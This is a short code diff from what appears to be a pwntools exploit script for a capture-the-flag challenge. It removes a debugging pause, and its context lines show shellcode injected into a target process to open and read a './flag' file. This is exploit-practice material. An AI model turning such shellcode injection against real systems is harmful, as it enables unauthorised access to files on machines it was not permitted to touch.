@@ -36,7 +36,6 @@ shellcode = asm("""
 io.sendline(shellcode)
 print(len(shellcode))
 
-raw_input()
 shellcode = shellcraft.pushstr("./flag")
 shellcode += shellcraft.open("rsp")
 shellcode += shellcraft.read("rax", "rsp", 100)
